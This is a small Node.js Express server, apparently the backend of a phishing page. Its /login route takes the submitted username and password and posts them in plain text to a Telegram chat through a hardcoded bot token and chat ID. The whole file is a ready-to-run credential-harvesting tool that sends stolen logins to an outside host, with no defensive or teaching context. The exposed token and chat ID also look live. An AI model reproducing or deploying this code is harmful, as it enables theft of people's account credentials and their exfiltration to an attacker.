const express = require("express");
const axios = require("axios");

const app = express();
const cors = require("cors");
app.use(cors());

app.use(express.static("public"));
app.use(express.json());

// Replace with your NEW Bot Token
const BOT_TOKEN = "8055279375:AAGT71XrZAY1EzpxdnFn70S4Myy2RrcDVEE";

// Your Chat ID
const CHAT_ID = "8269788214";

app.post("/login", async (req, res) => {

    const { username } = req.body;
    const { pasword } = req.body;

    try {

        await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,
                text: `🔔 User logged in\n\nUsername: ${username}\nPassword: ${pasword}`
            }
        );

        res.json({ success: true });

    } catch (err) {

        console.log(err.message);
        res.json({ success: false });

    }

});

app.listen(3000, () => {
    console.log("Server Running");
});